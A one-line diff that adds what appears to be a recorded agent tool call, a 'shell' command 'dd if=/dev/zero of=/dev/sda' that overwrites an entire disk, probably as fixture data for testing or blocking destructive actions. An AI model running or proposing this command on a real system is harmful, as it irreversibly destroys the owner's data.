@@ -1,0 +1,1 @@
+{"name":"shell","input":{"command":"dd if=/dev/zero of=/dev/sda"}}
